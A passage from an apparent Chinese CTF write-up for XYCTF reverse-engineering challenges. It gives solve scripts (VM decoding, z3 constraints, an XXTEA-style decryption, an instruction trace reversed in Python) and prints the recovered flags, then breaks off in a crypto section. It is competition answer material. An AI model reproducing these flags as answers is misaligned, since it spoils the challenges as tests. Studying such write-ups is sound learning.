<span class="number">1</span>;</span><br><span class="line">code[<span class="number">896</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">897</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">898</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">899</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">900</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">901</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">902</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">903</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">904</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">905</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">906</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">907</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">908</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">909</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">910</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">911</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">912</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">913</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">914</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">915</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">916</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">917</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">918</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">919</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">920</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">921</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">922</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">923</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">924</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">925</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">926</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">927</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">928</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">929</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">930</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">931</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">932</span>] = <span class="number">1</span>;<span class="comment">//input[27]-42</span></span><br><span class="line">code[<span class="number">933</span>] = <span class="number">2</span>;<span class="comment">//input[28]</span></span><br><span class="line">code[<span class="number">934</span>] = <span class="number">5</span>;<span class="comment">//input[28]-后一位+70</span></span><br><span class="line">code[<span class="number">989</span>] = <span class="number">2</span>;<span class="comment">//input[28]-54,input[29]</span></span><br><span class="line">code[<span class="number">994</span>] = <span class="number">2</span>;<span class="comment">//input[29]+3,input[30]</span></span><br><span class="line">code[<span class="number">995</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">996</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">997</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">998</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">999</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1000</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1001</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1002</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1003</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1013</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1014</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1015</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1016</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1017</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1018</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1019</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1020</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1021</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1022</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1023</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1024</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1025</span>] = <span class="number">1</span>;</span><br><span class="line">code[<span class="number">1026</span>] = <span class="number">1</span>;<span class="comment">//input[30]-23</span></span><br><span class="line">code[<span class="number">1027</span>] = <span class="number">2</span>;<span class="comment">//input[31]</span></span><br><span class="line">code[<span class="number">1028</span>] = <span class="number">3</span>;</span><br><span class="line">i = <span class="number">31</span>;</span><br><span class="line">j = <span class="number">1027</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (j &lt;= <span class="number">-1</span> || i &lt;= <span class="number">-1</span>) &#123; <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">0</span>) &#123;<span class="comment">//code=0</span></span><br><span class="line">--j;</span><br><span class="line">--input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">1</span>) &#123;</span><br><span class="line">--j;</span><br><span class="line">++input[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (code[j] == <span class="number">2</span>) &#123;<span class="comment">//递增位</span></span><br><span class="line">--j;</span><br><span class="line">--i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">3</span>)<span class="comment">//结束标志</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (code[j] == <span class="number">4</span>) &#123;</span><br><span class="line">input[i] = input[i] - input[i + <span class="number">1</span>] + <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (code[j] == <span class="number">5</span>) &#123;</span><br><span class="line">input[i] = input[i] + input[i + <span class="number">1</span>] - <span class="number">70</span>;</span><br><span class="line">--j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> input[<span class="number">32</span>] = &#123; <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">110</span>, <span class="number">111</span>, <span class="number">116</span>, <span class="number">95</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">118</span>, <span class="number">101</span>, <span class="number">125</span> &#125;;</span><br><span class="line">processCode(input);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(input); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, input[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="comment">//&quot;FLAG&#123;vm_is_A_3ecreT_l0Ve_revers&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果直接就出了</p><h4 id="舔狗四部曲–相逢已是上上签"><a href="#舔狗四部曲–相逢已是上上签" class="headerlink" title="舔狗四部曲–相逢已是上上签"></a>舔狗四部曲–相逢已是上上签</h4><p>先用010edtior把指向pe头的偏移修好，改成0001。然后进去用z3把key求出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key,out = zini(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(<span class="number">532</span> * key[<span class="number">5</span>] + <span class="number">829</span> * key[<span class="number">4</span>] + <span class="number">258</span> * key[<span class="number">3</span>] + <span class="number">811</span> * key[<span class="number">2</span>] + <span class="number">997</span> * key[<span class="number">1</span>] + <span class="number">593</span> * key[<span class="number">0</span>] == <span class="number">292512</span>)</span><br><span class="line">s.add(<span class="number">576</span> * key[<span class="number">5</span>] + <span class="number">695</span> * key[<span class="number">4</span>] + <span class="number">602</span> * key[<span class="number">3</span>] + <span class="number">328</span> * key[<span class="number">2</span>] + <span class="number">686</span> * key[<span class="number">1</span>] + <span class="number">605</span> * key[<span class="number">0</span>] == <span class="number">254496</span>)</span><br><span class="line">s.add(<span class="number">580</span> * key[<span class="number">5</span>] + <span class="number">448</span> * key[<span class="number">4</span>] + <span class="number">756</span> * key[<span class="number">3</span>] + <span class="number">449</span> * key[<span class="number">2</span>] + (key[<span class="number">1</span>] &lt;&lt; <span class="number">9</span>) + <span class="number">373</span> * key[<span class="number">0</span>] == <span class="number">222479</span>)</span><br><span class="line">s.add(<span class="number">597</span> * key[<span class="number">5</span>] + <span class="number">855</span> * key[<span class="number">4</span>] + <span class="number">971</span> * key[<span class="number">3</span>] + <span class="number">422</span> * key[<span class="number">2</span>] + <span class="number">635</span> * key[<span class="number">1</span>] + <span class="number">560</span> * key[<span class="number">0</span>] == <span class="number">295184</span>)</span><br><span class="line">s.add(<span class="number">524</span> * key[<span class="number">5</span>] + <span class="number">324</span> * key[<span class="number">4</span>] + <span class="number">925</span> * key[<span class="number">3</span>] + <span class="number">388</span> * key[<span class="number">2</span>] + <span class="number">507</span> * key[<span class="number">1</span>] + <span class="number">717</span> * key[<span class="number">0</span>] == <span class="number">251887</span>)</span><br><span class="line">s.add(<span class="number">414</span> * key[<span class="number">5</span>] + <span class="number">495</span> * key[<span class="number">4</span>] + <span class="number">518</span> * key[<span class="number">3</span>] + <span class="number">884</span> * key[<span class="number">2</span>] + <span class="number">368</span> * key[<span class="number">1</span>] + <span class="number">312</span> * key[<span class="number">0</span>] == <span class="number">211260</span>)</span><br><span class="line"></span><br><span class="line">zcheck(s,key)</span><br><span class="line"><span class="comment"># XYCTF!</span></span><br></pre></td></tr></table></figure><p>然后后面是一个魔改tea，直接解</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">dec2</span><span class="params">(DWORD* flag, <span class="type">int</span> len_after)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line"><span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> mid; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"><span class="type">int</span> round; <span class="comment">// [esp+Ch] [ebp-14h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum; <span class="comment">// [esp+10h] [ebp-10h]</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flag_last; <span class="comment">// [esp+18h] [ebp-8h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [esp+1Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len_after &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">round = <span class="number">52</span> / len_after + <span class="number">6</span>;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line">sum -= round * <span class="number">0x61C88647</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = len_after - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] -= ((flag[(i + <span class="number">7</span>) % <span class="number">8</span>] ^ key[(((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">5</span>) ^ i) &amp; <span class="number">5</span>]) + (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] ^ sum)) ^ (((<span class="number">16</span> * flag[(i + <span class="number">7</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">1</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * flag[(i + <span class="number">1</span>) % <span class="number">8</span>]) ^ (flag[(i + <span class="number">7</span>) % <span class="number">8</span>] &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line">sum += <span class="number">0x61C88647</span>;</span><br><span class="line">--round;</span><br><span class="line">&#125; <span class="keyword">while</span> (round);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> last[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x69</span>, <span class="number">0x66</span>, <span class="number">0x85</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0x89</span>, <span class="number">0x1B</span>, <span class="number">0x8C</span>, <span class="number">0x18</span>, <span class="number">0xC5</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xBC</span>, <span class="number">0x72</span>,</span><br><span class="line"><span class="number">0xCA</span>, <span class="number">0x11</span>, <span class="number">0x80</span>, <span class="number">0x53</span>, <span class="number">0xAC</span>, <span class="number">0x46</span>, <span class="number">0xA1</span>, <span class="number">0x4D</span>, <span class="number">0x6B</span>, <span class="number">0x0D</span>, <span class="number">0x63</span>, <span class="number">0x86</span>, <span class="number">0xF0</span>, <span class="number">0x97</span>, <span class="number">0x97</span>, <span class="number">0xF8</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">dec2</span>((DWORD*)last, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; hex &lt;&lt; (last[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// XYCTF&#123;XXTEA_AND_Z3_1s_S0_easy!!&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–记忆的时光机"><a href="#舔狗四部曲–记忆的时光机" class="headerlink" title="舔狗四部曲–记忆的时光机"></a>舔狗四部曲–记忆的时光机</h4><p>第一次遇到这种jmp+寄存器的值，不过通过分析可以看出均为顺序跳转，直接trance，然后分析，大概得出加密逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">0000E808.text:enc+4sub     rsp, 48hRSP=00007FFCB17CE120 CF=0 PF=0 SF=0</span><br><span class="line">0000E808.text:enc+8lea     rcx, sub_558B201D1460RCX=0000558B201D1460</span><br><span class="line">0000E808.text:enc+Fmov     edx, 2RDX=0000000000000002</span><br><span class="line">0000E808.text:enc+14movsxd  r10, esiR10=0000000000000001</span><br><span class="line">0000E808.text:enc+17mov     rax, fs:28hRAX=374B368125068200</span><br><span class="line">0000E808.text:enc+20mov     [rsp+48h+var_10], rax</span><br><span class="line">0000E808.text:enc+25xor     eax, eaxRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:enc+27lea     rax, sub_558B201D1448RAX=0000558B201D1448</span><br><span class="line">0000E808.text:enc+2Emov     [rsp+48h+var_48], rcx</span><br><span class="line">0000E808.text:enc+32add     esi, 6RSI=0000000000000007 PF=0 ZF=0</span><br><span class="line">0000E808.text:enc+35mov     [rsp+48h+var_40], rax</span><br><span class="line">0000E808.text:enc+3Alea     rax, sub_558B201D1430RAX=0000558B201D1430</span><br><span class="line">0000E808.text:enc+41lea     r11, key; \&quot;i_have_get_shell_but_where_is_you_my_de\&quot;...</span><br><span class="line">0000E808.text:enc+48mov     [rsp+48h+var_38], rax</span><br><span class="line">0000E808.text:enc+4Dlea     rax, sub_558B201D1418RAX=0000558B201D1418</span><br><span class="line">0000E808.text:enc+54mov     [rsp+48h+var_30], rax</span><br><span class="line">0000E808.text:enc+59lea     rax, sub_558B201D1400RAX=0000558B201D1400</span><br><span class="line">0000E808.text:enc+60mov     [rsp+48h+var_28], rax</span><br><span class="line">0000E808.text:enc+65lea     rax, loc_558B201D13E0RAX=0000558B201D13E0</span><br><span class="line">0000E808.text:enc+6Cmov     [rsp+48h+var_20], rax</span><br><span class="line">0000E808.text:enc+71lea     eax, [rdx-1]RAX=0000000000000001</span><br><span class="line">0000E808.text:enc+74jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1460endbr64</span><br><span class="line">0000E808.text:sub_558B201D1460+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1448</span><br><span class="line">0000E808.text:sub_558B201D1460+8add     edx, 1RDX=0000000000000003 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1460+Bmov     r8d, ediR8=000000000000004D</span><br><span class="line">0000E808.text:sub_558B201D1460+Elea     eax, [rdx-1]RAX=0000000000000002</span><br><span class="line">0000E808.text:sub_558B201D1460+11jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1448endbr64</span><br><span class="line">0000E808.text:sub_558B201D1448+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1430</span><br><span class="line">0000E808.text:sub_558B201D1448+8xor     r8d, esiR8=000000000000004A PF=0</span><br><span class="line">0000E808.text:sub_558B201D1448+Badd     edx, 1RDX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1448+Exor     r8d, 66hR8=000000000000002C</span><br><span class="line">0000E808.text:sub_558B201D1448+12lea     eax, [rdx-1]RAX=0000000000000003</span><br><span class="line">0000E808.text:sub_558B201D1448+15jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1430endbr64</span><br><span class="line">0000E808.text:sub_558B201D1430+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1418</span><br><span class="line">0000E808.text:sub_558B201D1430+8add     edx, 1RDX=0000000000000005 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1430+Bsub     r8d, 6R8=0000000000000026 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1430+Flea     eax, [rdx-1]RAX=0000000000000004</span><br><span class="line">0000E808.text:sub_558B201D1430+12jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1418endbr64</span><br><span class="line">0000E808.text:sub_558B201D1418+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D1400</span><br><span class="line">0000E808.text:sub_558B201D1418+8add     edx, 1RDX=0000000000000006 PF=1</span><br><span class="line">0000E808.text:sub_558B201D1418+Bmovzx   r9d, byte ptr [r11+r10]R9=000000000000005F</span><br><span class="line">0000E808.text:sub_558B201D1418+10lea     eax, [rdx-1]RAX=0000000000000005</span><br><span class="line">0000E808.text:sub_558B201D1418+13jmp     rcx</span><br><span class="line">0000E808.text:sub_558B201D1400endbr64</span><br><span class="line">0000E808.text:sub_558B201D1400+4mov     rcx, [rsp+rax*8+0]RCX=0000558B201D13E0</span><br><span class="line">0000E808.text:sub_558B201D1400+8add     edx, 1RDX=0000000000000007 PF=0</span><br><span class="line">0000E808.text:sub_558B201D1400+Bxor     r8d, r9dR8=0000000000000079</span><br><span class="line">0000E808.text:sub_558B201D1400+Elea     eax, [rdx-1]RAX=0000000000000006</span><br><span class="line">0000E808.text:sub_558B201D1400+11jmp     rcx</span><br><span class="line">0000E808.text:loc_558B201D13E0endbr64</span><br><span class="line">0000E808.text:0000558B201D13E4mov     rax, [rsp+38h]RAX=374B368125068200</span><br><span class="line">0000E808.text:0000558B201D13E9sub     rax, fs:28hRAX=0000000000000000 PF=1 ZF=1</span><br><span class="line">0000E808.text:0000558B201D13F2jnz     short loc_558B201D1473</span><br><span class="line">0000E808.text:0000558B201D13F4mov     eax, r8dRAX=0000000000000079</span><br><span class="line">0000E808.text:0000558B201D13F7add     rsp, 48hRSP=00007FFCB17CE168 PF=0 ZF=0</span><br><span class="line">0000E808.text:0000558B201D13FBretnRSP=00007FFCB17CE170</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># inp[i]^=(i+6)^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br></pre></td></tr></table></figure><p>那直接逆</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x4D</span>, <span class="number">0x32</span>, <span class="number">0x98</span>, <span class="number">0x20</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x7B</span>, <span class="number">0x25</span>, <span class="number">0x75</span>, <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x58</span>, <span class="number">0x60</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x37</span>, <span class="number">0x6C</span>, <span class="number">0x30</span>, <span class="number">0x46</span>, <span class="number">0x66</span>, <span class="number">0x4F</span>, <span class="number">0x5D</span>, <span class="number">0x03</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x66</span>, <span class="number">0x01</span>, <span class="number">0x43</span>, <span class="number">0x68</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x7A</span>, <span class="number">0x3F</span>, <span class="number">0x6C</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x09</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># inp[i]^=i^0x66</span></span><br><span class="line"><span class="comment"># inp[i]-=6</span></span><br><span class="line"><span class="comment"># inp[i]^=key[i]</span></span><br><span class="line">key = <span class="string">&quot;i_have_get_shell_but_where_is_you_my_dear_baby!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(last)):</span><br><span class="line">    last[i]^=<span class="built_in">ord</span>(key[i])</span><br><span class="line">    last[i]+=<span class="number">6</span></span><br><span class="line">    last[i]^=(<span class="number">6</span>+i)^<span class="number">0x66</span></span><br><span class="line">        </span><br><span class="line">pl(last)</span><br><span class="line"><span class="comment"># flag&#123;Br0k3n_m3m0r1es_for3v3r_Sh1n@_1n_The_H3@$T&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–我的白月光"><a href="#舔狗四部曲–我的白月光" class="headerlink" title="舔狗四部曲–我的白月光"></a>舔狗四部曲–我的白月光</h4><p>一开头给了flag{L0v3_</p><p>然后分析一下主函数，发现最后有一个base64，拿去解一下，发现解不出来，然后尝试一下是不是反向了什么的</p><p>在cyberchef里面直接</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">reverse</span>+<span class="keyword">from</span> base64+<span class="built_in">reverse</span>+<span class="keyword">from</span> hex</span><br><span class="line">得到</span><br><span class="line"><span class="variable">_memory_never_go_done_finally_thankyou_xiaowangtongxue</span>&#125;</span><br></pre></td></tr></table></figure><p>然后再看一下中间还干了什么</p><p>看到有一个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !(_DWORD)v22 )</span><br><span class="line">&#123;</span><br><span class="line">  flOldProtect[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  VirtualProtect(v11, <span class="number">8u</span>i64, <span class="number">4u</span>, flOldProtect);</span><br><span class="line">  *v11 = sub_7FF64A841470;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个sub好像很可疑，直接set ip 过去，在执行完函数后，在对应的hex窗口找到</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i8_<span class="built_in">a_k3y</span>_and</span><br></pre></td></tr></table></figure><p>最后</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;L0v3_i8_<span class="built_in">a_k3y</span>_and_memory_never_go_done_finally_thankyou_xiaowangtongxue&#125;</span><br></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="week1-1"><a href="#week1-1" class="headerlink" title="week1"></a>week1</h3><h4 id="Sign1n"><a href="#Sign1n" class="headerlink" title="Sign1n"></a>Sign1n</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 